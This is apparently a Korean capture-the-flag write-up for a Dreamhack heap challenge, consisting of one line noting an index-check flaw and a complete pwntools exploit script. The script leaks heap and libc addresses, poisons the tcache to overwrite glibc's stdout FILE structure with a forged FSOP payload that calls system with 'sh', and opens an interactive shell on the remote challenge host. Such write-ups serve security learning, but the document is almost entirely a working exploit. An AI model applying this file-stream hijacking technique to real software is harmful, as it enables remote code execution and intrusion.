index 관리를 `> 3`으로 하고 있어서 4가 아니라 5, 6으로 해도 heap 청크로 여겨진다. 꽤나 주요한 취약점일 것 같다. 그후엔 FSOP

```python
from pwn import *

p = remote('host3.dreamhack.games', 9077)
#p = process('./prob')
l = ELF('./libc.so.6')

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def alloc(idx : int, typ : int, length : int, data : bytes):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Type: ', str(typ).encode())
    if typ == 4 :
        p.sendlineafter(b'Length: ', str(length).encode())
        p.sendlineafter(b'Data: ', data)
    elif typ <= 3 : 
        p.sendlineafter(b'Value: ', str(length).encode())

def free(idx : int):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def rd(idx : int):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.recvuntil(b'Value: ')
    return p.recvline()[:-1]

def wr(idx : int, length : int, data : bytes):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Length: ', str(length).encode())
    p.sendlineafter(b'Data: ', data)

alloc(0, 4, 0x10, b'a' * 0x10)
alloc(1, 4, 0x10, b'c' * 0x10)
alloc(2, 4, 0x500, b'b' * 0x10)
alloc(3, 4, 0x10, b'c' * 0x10)
free(1)
free(2)
alloc(0, 3, 0x50, b'')
alloc(0, 5, 0, b'')
heap_base = u64(rd(0)[0x20:][:8]) << 12
l.address = u64(rd(0)[0x40:][:8]) - (0x7ffff7faeb20 - 0x7ffff7dab000)
stdout_lock = l.address + 0x205710
print(hex(heap_base))
print(hex(l.address))

alloc(4, 4, 0x10, b'a' * 0x10)
alloc(4, 4, 0x10, b'a' * 0x10)
alloc(5, 4, 0xe0, b'b' * 0xe0)
alloc(6, 4, 0xe0, b'b' * 0xe0)
free(6)
free(5)
alloc(4, 3, 0x40, b'')
alloc(4, 5, 0, b'')

fake_fsop_struct = l.sym['_IO_2_1_stdout_']
FSOP = FSOP_struct(
    flags=u64(b"\x01\x01\x01\x01;sh\x00"),
    lock=stdout_lock,
    _wide_data=fake_fsop_struct - 0x10,
    _markers=l.symbols["system"],
    _unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
    vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
    _mode=0xFFFFFFFF,
)


wr(4, 0, b'a' * 0x18 + p64(0xf1) + p64((l.sym['_IO_2_1_stdout_']) ^ (heap_base >> 12)))
alloc(8, 4, 0xe0, b'a')
alloc(9, 4, 0xe0, FSOP)
p.interactive()
```